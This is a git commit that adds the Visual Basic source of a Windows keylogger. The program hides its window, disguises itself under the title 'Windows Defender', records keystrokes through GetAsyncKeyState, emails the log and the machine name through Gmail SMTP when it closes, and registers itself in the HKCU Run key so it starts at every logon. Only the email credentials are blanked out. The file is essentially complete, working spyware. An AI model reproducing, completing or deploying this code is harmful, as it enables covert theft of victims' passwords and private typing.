3c0dbb9202c55ef8d683dba204036beba4e26cbf
Pradeep Senthil <pradeepsen99@gmail.com>
2017-11-26 00:15:05 -0600

    First Commit

---
+++ keyLogger/Form1.Designer.vb
@@ -0,0 +1,77 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.SuspendLayout()
+        '
+        'Timer1
+        '
+        Me.Timer1.Enabled = True
+        Me.Timer1.Interval = 50
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Location = New System.Drawing.Point(222, 354)
+        Me.Label1.Margin = New System.Windows.Forms.Padding(6, 0, 6, 0)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(0, 25)
+        Me.Label1.TabIndex = 1
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Location = New System.Drawing.Point(189, 0)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(71, 25)
+        Me.Label2.TabIndex = 2
+        Me.Label2.Text = "Label2"
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(11.0!, 24.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(381, 0)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.Margin = New System.Windows.Forms.Padding(6, 6, 6, 6)
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "Form1"
+        Me.Opacity = 0R
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.Text = "Windows Defender"
+        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents Timer1 As Timer
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label2 As Label
+End Class
---
+++ keyLogger/Form1.vb
@@ -0,0 +1,82 @@
+﻿'Author: Pradeep Senthil
+'Version: 1.4
+'Date: 2017
+
+Imports System.ComponentModel
+Imports System.IO
+Imports System.Net
+Imports System.Net.Mail
+
+Public Class Form1
+
+    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal Keys As Integer) As Short
+    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
+        Dim result As Integer
+        Dim key As String
+        Dim i As Integer
+        Dim switch As Integer = 1
+
+        For i = 2 To 90
+            result = 0
+            result = GetAsyncKeyState(i)
+
+            If result = -32767 Then
+                key = Chr(i)
+                If i = 13 Then key = vbNewLine
+                Exit For
+            End If
+        Next i
+
+        If key <> Nothing Then
+            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
+                Label1.Text &= key
+            Else
+                Label1.Text &= key.ToLower
+            End If
+        End If
+
+        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "V" Then
+            If switch = 1 Then
+                Me.Visible = True
+                Me.Opacity = 100
+                Me.WindowState = FormWindowState.Maximized
+                Me.ShowInTaskbar = True
+                Me.ShowIcon = True
+                'MsgBox(Label1.Text)
+                switch = 0
+            ElseIf switch = 0 Then
+                Me.Visible = False
+                Me.Opacity = 0
+                Me.WindowState = FormWindowState.Minimized
+                Me.ShowInTaskbar = False
+                Me.ShowIcon = False
+                'MsgBox(Label1.Text)
+            End If
+
+        End If
+    End Sub
+
+    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
+
+        'replaced all instances of username and password with underscores to prevent usage of account.
+        Using mm As New MailMessage("____________@gmail.com", "__________@gmail.com")
+            mm.Subject = "Name: " & Environment.MachineName & "     Time: " & DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
+            mm.Body = Label1.Text
+
+            Dim smtp As New SmtpClient
+            smtp.Host = "smtp.gmail.com"
+            smtp.EnableSsl = True
+
+            Dim networkcred As New NetworkCredential("___________@gmail.com", "_______")
+            smtp.UseDefaultCredentials = True
+            smtp.Credentials = networkcred
+            smtp.Port = 587
+            smtp.Send(mm)
+        End Using
+
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
+    End Sub
+End Class
